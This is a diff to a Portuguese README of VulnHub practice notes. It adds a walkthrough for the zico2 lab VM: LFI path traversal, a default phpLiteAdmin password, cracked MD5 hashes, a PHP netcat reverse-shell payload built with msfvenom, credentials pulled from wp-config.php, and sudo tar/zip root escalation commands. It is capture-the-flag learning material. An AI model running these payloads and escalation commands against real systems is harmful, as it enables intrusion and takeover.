@@ -24,7 +24,7 @@ Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://
 Desafio 22 - Fake GoogleBot | LFI | Misconfiguration | $PATH abuse - https://www.vulnhub.com/entry/inclusiveness-1,422/</br>
 Desafio 23 - RCE sar2HTML | crontab abuse  - https://www.vulnhub.com/entry/sar-1,425/ </br>
 Desafio 24 - PHP LiteAdmin 1.9.3 exploit | sudo tar/zip abuse -  https://www.vulnhub.com/entry/zico2-1,210/</br>
-Desafio 25 - - </br>
+Desafio 25 - - https://www.vulnhub.com/entry/photographer-1,519/ </br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1094,3 +1094,67 @@ Desafio 25 - - </br>
 		kali: nc -lnvp 443
 			
 		root
+
+
+
+<h3>Dia 24 			30/9/2020</h3>
+
+	*browser
+	#LFI
+		http://192.168.100.30/view.php?page=tools.html
+			http://192.168.100.30/view.php?page=../../../../../../../../etc/passwd
+	
+	*dirb
+		ip/dbadmin
+			test_db_admin.php
+			pass: admin
+			
+			*table: test_users -> table info
+			http://192.168.100.30/dbadmin/test_db.php?action=row_view&table=info
+			decode pass MD5
+				crackstation 
+					root: 34kroot34
+					zico: zico2215@
+				
+		create new database
+		beco24.php
+		criar tabela, 1 coluna
+			name: xx
+			type text
+			kali: msfvenom -p cmd/unix/reverse_netcat lport=443 lhost=ipkali -f raw
+			VALUE: <?php exec("mkfifo /tmp/gmifjwk; nc 10.0.2.4 443 0</tmp/gmifjwk | /bin/sh >/tmp/gmifjwk 2>&1; rm /tmp/gmifjwk");?>
+			
+		*nc lnvp 443
+		http://192.168.100.30/view.php?page=../../../../../../../../usr/databases/beco.php
+		
+
+		cd /home/zico/wordpress
+		cat wp-config.php
+			/** The name of the database for WordPress */
+			define('DB_NAME', 'zico');
+
+			/** MySQL database username */
+			define('DB_USER', 'zico');
+
+			/** MySQL database password */
+			define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
+
+			/** MySQL hostname */
+			define('DB_HOST', 'zico');
+			
+		*ssh zico@ip
+		pass: sWfCsfJSPV9H3AmQzw8
+		
+		sudo -l
+		
+		cd /tmp
+		
+		#TAR
+		touch file
+		sudo /bin/tar -c -f /tmp/file . --checkpoint=1 --checkpoint-action=exec='sudo su'
+		
+		~root
+		
+		#ZIP
+		touch beco24
+		sudo zip /tmp/beco24.zip /tmp/beco24 -T --unzip-command="sh -c /bin/bash"
